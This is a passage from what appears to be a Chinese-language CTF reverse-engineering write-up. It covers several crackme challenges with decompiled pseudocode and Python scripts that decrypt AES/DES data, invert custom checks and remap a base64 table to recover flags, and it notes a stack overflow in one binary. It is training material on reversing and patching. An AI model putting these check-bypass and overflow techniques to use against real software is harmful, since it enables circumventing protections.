&#125;</span><br><span class="line">  v4[v3] = <span class="number">0</span>;</span><br><span class="line">  v12 = (<span class="keyword">char</span> *)unknown_libname_1(Size);</span><br><span class="line">  v29 = v12;</span><br><span class="line">  <span class="built_in">memset</span>(v12, <span class="number">0</span>, Size);</span><br><span class="line">  v30 = &amp;AES::`vftable<span class="number">&#x27;</span>;</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  aes_init((<span class="keyword">int</span>)&amp;v30, v19, v20, v21, v22);      <span class="comment">// key硬编码在里面</span></span><br><span class="line">  v13 = v31;</span><br><span class="line">  <span class="keyword">if</span> ( v31 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v24 )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = v33;</span><br><span class="line">      <span class="keyword">if</span> ( !(v24 % v33) )</span><br><span class="line">      &#123;</span><br><span class="line">        v15 = Block;</span><br><span class="line">        Sizea = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v24 / v33 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v16 = v35;</span><br><span class="line">            <span class="keyword">if</span> ( v13 )</span><br><span class="line">            &#123;</span><br><span class="line">              v17 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v14 &gt; <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">do</span></span><br><span class="line">                  *v16++ ^= v15[v17++];         <span class="comment">// v16为iv</span></span><br><span class="line">                <span class="keyword">while</span> ( v17 &lt; (<span class="keyword">int</span>)v33 );</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sub_4013E0((<span class="keyword">int</span>)&amp;v30, v35, v12);</span><br><span class="line">            <span class="built_in">memcpy</span>(v35, v12, v33);</span><br><span class="line">            v14 = v33;</span><br><span class="line">            v15 += v33;</span><br><span class="line">            v12 += v33;</span><br><span class="line">            <span class="keyword">if</span> ( ++Sizea &gt;= v24 / v33 )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v13 = v31;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        v12 = v29;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401A70(a1, v12, v24);</span><br><span class="line">  j_j_free(Block);</span><br><span class="line">  j_j_free(v12);</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">b&quot;nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo=&quot;</span></span><br><span class="line">cipher = base64.b64decode(s)</span><br><span class="line">key = <span class="string">b&quot;sycloversyclover&quot;</span></span><br><span class="line">iv = <span class="string">b&quot;sctfsctfsctfsctf&quot;</span></span><br><span class="line">obj = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">plain = obj.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure><h3 id="GKCTF-2021-QQQQT"><a href="#GKCTF-2021-QQQQT" class="headerlink" title="[GKCTF 2021]QQQQT"></a>[GKCTF 2021]QQQQT</h3><p>反编译后base58 解密</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211012231300878.png"></p><h3 id="SCTF2019-Who-is-he"><a href="#SCTF2019-Who-is-he" class="headerlink" title="[SCTF2019]Who is he"></a>[SCTF2019]Who is he</h3><p>Unity逆向，主要看<code>Assembly-CSharp.dll</code>, DES解密， </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void OnClick()</span><br><span class="line">&#123;</span><br><span class="line">Debug.Log(&quot;Button Clicked. TestClick.&quot;);</span><br><span class="line">Debug.Log(this.Name.text);</span><br><span class="line">bool flag = this.Name.text.Equals(this.Decrypt(this.EncryptData));</span><br><span class="line">if (flag)</span><br><span class="line">&#123;</span><br><span class="line">Debug.Log(&quot;Right&quot;);</span><br><span class="line">TestClick.Messagebox.MessageBox(IntPtr.Zero, &quot;Haha, same as you!&quot;, &quot;Info:&quot;, 0);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">Debug.Log(&quot;Wrong&quot;);</span><br><span class="line">TestClick.Messagebox.MessageBox(IntPtr.Zero, &quot;Emmmmm,I don&#x27;t think so.&quot;, &quot;Info:&quot;, 0);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private string Decrypt(string str)</span><br><span class="line">&#123;</span><br><span class="line">string result;</span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">byte[] bytes = Encoding.Unicode.GetBytes(TestClick.encryptKey);</span><br><span class="line">byte[] array = Convert.FromBase64String(str);</span><br><span class="line">DESCryptoServiceProvider descryptoServiceProvider = new DESCryptoServiceProvider();</span><br><span class="line">MemoryStream memoryStream = new MemoryStream();</span><br><span class="line">CryptoStream cryptoStream = new CryptoStream(memoryStream, descryptoServiceProvider.CreateDecryptor(bytes, bytes), CryptoStreamMode.Write);</span><br><span class="line">cryptoStream.Write(array, 0, array.Length);</span><br><span class="line">cryptoStream.FlushFinalBlock();</span><br><span class="line">byte[] bytes2 = memoryStream.ToArray();</span><br><span class="line">cryptoStream.Close();</span><br><span class="line">memoryStream.Close();</span><br><span class="line">result = Encoding.Unicode.GetString(bytes2);</span><br><span class="line">&#125;</span><br><span class="line">catch</span><br><span class="line">&#123;</span><br><span class="line">result = str;</span><br><span class="line">&#125;</span><br><span class="line">return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于<code>Encoding.GetEncoding(&quot;utf-8&quot;).GetBytes</code>故密钥每个字符后面要补上<code>\x00</code>, 解得假flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">cipher = <span class="string">b&quot;1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA==&quot;</span></span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">key = <span class="string">b&quot;1\x002\x003\x004\x00&quot;</span></span><br><span class="line">iv = key</span><br><span class="line">des = DES.new(key, DES.MODE_CBC, iv)</span><br><span class="line">plain = des.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(plain.decode(<span class="string">&#x27;UTF-16&#x27;</span>))</span><br></pre></td></tr></table></figure><p>动态调试程序，根据传参规则，在栈中找到两个参数</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211015162152572.png" alt="image-20211015162152572"></p><p>在返回值处下断，不断调试跟踪，找到</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211015162253459.png" alt="image-20211015162253459"></p><p>此处有个跳转，该跳转就是跳到错误提示的地方，如果不调转则会输出正确输出，则断在<code>call r11</code>，进去后根据传参规则，查看<code>rdi</code>就是我们的输入，<code>rsi</code>则是对比的flag</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211015163141171.png" alt="image-20211015163141171"></p><p>得到flag</p><h3 id="FlareOn2-very-success"><a href="#FlareOn2-very-success" class="headerlink" title="[FlareOn2]very_success"></a>[FlareOn2]very_success</h3><p>ida32打开, 根据字符串搜索找到主要函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line">BOOL __usercall sub_401000@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp-14h] [ebp-14h]</span></span><br><span class="line">  HANDLE StdHandle; <span class="comment">// [esp-10h] [ebp-10h]</span></span><br><span class="line">  HANDLE v5; <span class="comment">// [esp-Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp-8h] [ebp-8h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp-4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = v7;</span><br><span class="line">  v7 = a1;</span><br><span class="line">  v3 = v1;</span><br><span class="line">  StdHandle = GetStdHandle(<span class="number">0xFFFFFFF6</span>);</span><br><span class="line">  v5 = GetStdHandle(<span class="number">0xFFFFFFF5</span>);</span><br><span class="line">  WriteFile(v5, aYouCrushedThat, <span class="number">0x43</span>u, (LPDWORD)&amp;v6, <span class="number">0</span>);</span><br><span class="line">  ReadFile(StdHandle, flag, <span class="number">0x32</span>u, (LPDWORD)&amp;v6, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( sub_401084((<span class="keyword">int</span>)&amp;v6, v3, flag, v6) )</span><br><span class="line">    <span class="keyword">return</span> WriteFile(v5, aYouAreSuccess, <span class="number">0x11</span>u, (LPDWORD)&amp;v6, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> WriteFile(v5, aYouAreFailure, <span class="number">0x11</span>u, (LPDWORD)&amp;v6, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中sub_401084函数为check函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="keyword">int</span> __usercall sub_401084@&lt;eax&gt;(<span class="keyword">int</span> result@&lt;eax&gt;, <span class="keyword">int</span> a2, <span class="keyword">char</span> *a3, <span class="keyword">int</span> a4)</span><br><span class="line">&#123;</span><br><span class="line">  __int16 v4; <span class="comment">// bx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// cf</span></span><br><span class="line">  __int16 v12; <span class="comment">// ax</span></span><br><span class="line">  <span class="keyword">bool</span> v13; <span class="comment">// zf</span></span><br><span class="line">  _BYTE *v14; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">37</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a4 &gt;= <span class="number">37</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (_BYTE *)(a2 + <span class="number">36</span>);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LOWORD(result) = <span class="number">0x1C7</span>;</span><br><span class="line">      v15 = result;</span><br><span class="line">      v8 = *a3++;</span><br><span class="line">      v9 = __readeflags();</span><br><span class="line">      v10 = v15 ^ v8;</span><br><span class="line">      __writeeflags(v9);</span><br><span class="line">      v12 = (<span class="keyword">unsigned</span> __int8)(__ROL1__(<span class="number">1</span>, v4 &amp; <span class="number">3</span>) + v11 + v10);</span><br><span class="line">      v4 += v12;</span><br><span class="line">      v13 = *v7 == (<span class="keyword">unsigned</span> __int8)v12;</span><br><span class="line">      v14 = v7 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v13 )</span><br><span class="line">        LOWORD(v5) = <span class="number">0</span>;</span><br><span class="line">      result = v15;</span><br><span class="line">      <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v7 = v14 - <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !--v5 )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则可知flag长度大于等于37， v7为对比的数据，从后往前check，动调，发现为<code>start</code>往下</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211015173545176.png" alt="image-20211015173545176"></p><p>对输入的数据加密如下，只不过反编译出来有些奇怪。其中<code>sum</code>从0开始，每次加上计算后的数，即本次对比的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(input ^ 0xC7) + (1 &lt;&lt; (sum &amp; 3)) + 1 </span><br></pre></td></tr></table></figure><p>则解密脚本为</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = [<span class="number">0xAF</span>, <span class="number">0xAA</span>, <span class="number">0xAD</span>, <span class="number">0xEB</span>, <span class="number">0xAE</span>, <span class="number">0xAA</span>, <span class="number">0xEC</span>, <span class="number">0xA4</span>, <span class="number">0xBA</span>, <span class="number">0xAF</span>, <span class="number">0xAE</span>, <span class="number">0xAA</span>, <span class="number">0x8A</span>, <span class="number">0xC0</span>, <span class="number">0xA7</span>, <span class="number">0xB0</span>, <span class="number">0xBC</span>, <span class="number">0x9A</span>, <span class="number">0xBA</span>, <span class="number">0xA5</span>, <span class="number">0xA5</span>, <span class="number">0xBA</span>, <span class="number">0xAF</span>, <span class="number">0xB8</span>, <span class="number">0x9D</span>, <span class="number">0xB8</span>, <span class="number">0xF9</span>, <span class="number">0xAE</span>, <span class="number">0x9D</span>, <span class="number">0xAB</span>, <span class="number">0xB4</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xB3</span>, <span class="number">0x90</span>, <span class="number">0x9A</span>, <span class="number">0xA8</span>][::-<span class="number">1</span>]</span><br><span class="line">x = <span class="number">0xC7</span></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL1</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; x</span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">    flag += <span class="built_in">bytes</span>([(i - ROL1(<span class="built_in">sum</span> &amp; <span class="number">3</span>) - <span class="number">1</span>) ^ x])</span><br><span class="line">    <span class="built_in">sum</span> += i</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="CISCN2018-2ex"><a href="#CISCN2018-2ex" class="headerlink" title="[CISCN2018]2ex"></a>[CISCN2018]2ex</h3><p>MIPS32, IDA打开，找到主要函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400788</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">20</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">28</span>]; <span class="comment">// [sp+2Ch] [+2Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_400840(v1);                               <span class="comment">// read v1</span></span><br><span class="line">  sub_4010F0((<span class="keyword">int</span>)v2, <span class="number">25</span>);</span><br><span class="line">  sub_400430(v1, <span class="number">17u</span>, v2);                      <span class="comment">// change_table_base64, v1 =&gt; in, v2 =&gt; out</span></span><br><span class="line">  sub_4009C0((<span class="keyword">int</span>)v2);                          <span class="comment">// print(v2)</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>导出新表，解得<code>flag</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">new_table = <span class="built_in">bytes</span>([<span class="number">0x40</span>, <span class="number">0x2C</span>, <span class="number">0x2E</span>, <span class="number">0x31</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x23</span>, <span class="number">0x60</span>, <span class="number">0x2F</span>, <span class="number">0x32</span>, <span class="number">0x65</span>, <span class="number">0x68</span>, <span class="number">0x75</span>, <span class="number">0x78</span>, <span class="number">0x24</span>, <span class="number">0x7E</span>, <span class="number">0x22</span>, <span class="number">0x33</span>, <span class="number">0x64</span>, <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x79</span>, <span class="number">0x25</span>, <span class="number">0x5F</span>, <span class="number">0x3B</span>, <span class="number">0x34</span>, <span class="number">0x63</span>, <span class="number">0x6A</span>, <span class="number">0x73</span>, <span class="number">0x7A</span>, <span class="number">0x5E</span>, <span class="number">0x2B</span>, <span class="number">0x7B</span>, <span class="number">0x35</span>, <span class="number">0x62</span>, <span class="number">0x6B</span>, <span class="number">0x72</span>, <span class="number">0x41</span>, <span class="number">0x26</span>, <span class="number">0x3D</span>, <span class="number">0x7D</span>, <span class="number">0x36</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x71</span>, <span class="number">0x42</span>, <span class="number">0x2A</span>, <span class="number">0x2D</span>, <span class="number">0x5B</span>, <span class="number">0x37</span>, <span class="number">0x30</span>, <span class="number">0x6D</span>, <span class="number">0x70</span>, <span class="number">0x43</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x5D</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x44</span>])</span><br><span class="line">old_table = <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(new_table), <span class="built_in">len</span>(old_table))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    d = file.read()</span><br><span class="line">    d = d.translate(<span class="built_in">bytes</span>.maketrans(new_table, old_table))</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line">    <span class="built_in">print</span>(base64.b64decode(d))</span><br></pre></td></tr></table></figure><h3 id="watevrCTF-2019-Timeout"><a href="#watevrCTF-2019-Timeout" class="headerlink" title="[watevrCTF 2019]Timeout"></a>[watevrCTF 2019]Timeout</h3><p>ida打开，本题有两种做法</p><h4 id="No-1"><a href="#No-1" class="headerlink" title="No.1"></a>No.1</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  signal(<span class="number">14</span>, (<span class="keyword">__sighandler_t</span>)sig);</span><br><span class="line">  alarm(<span class="number">1u</span>);</span><br><span class="line">  delay(<span class="number">6000000LL</span>);</span><br><span class="line">  can_continue = <span class="number">1337</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主函数，根据<code>can_continue</code>查引用，找到<code>generate</code>函数，直接得到flag</p><h4 id="No-2"><a href="#No-2" class="headerlink" title="No.2"></a>No.2</h4><p>patch<code>generate</code>函数判断条件，然后再main函数开头直接跳到<code>generate</code>函数</p><h3 id="网鼎杯-2020-青龙组-bang"><a href="#网鼎杯-2020-青龙组-bang" class="headerlink" title="[网鼎杯 2020 青龙组]bang"></a>[网鼎杯 2020 青龙组]bang</h3><p><a href="https://lantern.cool/wp-games-2020wd/">2020 网鼎杯 | Lantern’s 小站</a></p><h3 id="Dig-the-way"><a href="#Dig-the-way" class="headerlink" title="Dig the way"></a>Dig the way</h3><p>主函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> Str[<span class="number">20</span>]; <span class="comment">// [esp+1Ch] [ebp-48h] BYREF</span></span><br><span class="line">  _DWORD v7[<span class="number">3</span>]; <span class="comment">// [esp+30h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+3Ch] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+40h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+44h] [ebp-20h]</span></span><br><span class="line">  _DWORD v11[<span class="number">3</span>]; <span class="comment">// [esp+48h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [esp+54h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+58h] [ebp-Ch]</span></span><br><span class="line">  FILE *v14; <span class="comment">// [esp+5Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v11[<span class="number">0</span>] = func0;</span><br><span class="line">  v11[<span class="number">1</span>] = func1;</span><br><span class="line">  v11[<span class="number">2</span>] = func2;</span><br><span class="line">  v7[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v7[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">  v7[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">  v8 = <span class="number">3</span>;</span><br><span class="line">  v9 = <span class="number">3</span>;</span><br><span class="line">  v10 = <span class="number">4</span>;</span><br><span class="line">  v14 = fopen(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v14 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  fseek(v14, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">  v13 = ftell(v14);</span><br><span class="line">  fseek(v14, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  v12 = ftell(v14);</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;something wrong&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v13; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = i;</span><br><span class="line">      Str[v4] = fgetc(v14);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str) &lt;= v13 )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = v8;</span><br><span class="line">      i = <span class="number">0</span>;</span><br><span class="line">      v12 = v10;</span><br><span class="line">      <span class="keyword">while</span> ( i &lt;= <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = i + <span class="number">1</span>;</span><br><span class="line">        v7[v5] = ((<span class="keyword">int</span> (__cdecl *)(_DWORD *, <span class="keyword">int</span>, <span class="keyword">int</span>))v11[i])(v7, v9, v10);</span><br><span class="line">        v9 = ++i;</span><br><span class="line">        v10 = i + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        get_key(v13, v12);</span><br><span class="line">        system(<span class="string">&quot;PAUSE&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从data中读入数据，其中下述代码用于获得文件读入数据的长度</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fseek(v14, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line"> v13 = ftell(v14);</span><br><span class="line"> fseek(v14, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"> v12 = ftell(v14);</span><br></pre></td></tr></table></figure><p>而这串读入代码有栈溢出的风险，即越界写</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for ( i = 0; i &lt; v12; ++i )</span><br><span class="line">   &#123;</span><br><span class="line">     v4 = i;</span><br><span class="line">     Str[v4] = fgetc(v13);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>接下来研究3个函数</p><h4 id="fun0"><a href="#fun0" class="headerlink" title="fun0"></a>fun0</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">func0</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = *((_DWORD *)a1 + a2);</span><br><span class="line">  *((_DWORD *)a1 + a2) = *((_DWORD *)a1 + a3);</span><br><span class="line">  *((_DWORD *)a1 + a3) = v4;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将<code>a1 + a2</code> 与 <code>a1 + a3</code>处的数据进行交换</p><h4 id="fun1"><a href="#fun1" class="headerlink" title="fun1"></a>fun1</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">func1</span><span class="params">(_DWORD *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> abs32(a1[a2] + a1[a3]) - abs32(a1[a3]) - abs32(a1[a2]) + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即<code>|x1 + x2| - |x1| - |x2| + 2</code></p><h4 id="fun2"><a href="#fun2" class="headerlink" title="fun2"></a>fun2</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">func2</span><span class="params">(_DWORD *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> abs32(a1[a3]) - abs32(a1[a3] + a1[a2]) + abs32(a1[a2]) + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即<code>|x1| + |x2| - |x1 + x2| + 2</code></p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>我们的目标是使其输出flag, 即v8为0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        get_key(v13, v12);</span><br><span class="line">        system(<span class="string">&quot;PAUSE&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>而调用函数的循环中, 刚好溢出了一位</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ( i &lt;= <span class="number">2</span> )</span><br><span class="line">     &#123;</span><br><span class="line">       v5 = i + <span class="number">1</span>;</span><br><span class="line">       v7[v5] = ((<span class="keyword">int</span> (__cdecl *)(_DWORD *, <span class="keyword">int</span>, <span class="keyword">int</span>))v11[i])(v7, v9, v10);</span><br><span class="line">       v9 = ++i;</span><br><span class="line">       v10 = i + <span class="number">1</span>;</span><br><span class="line">     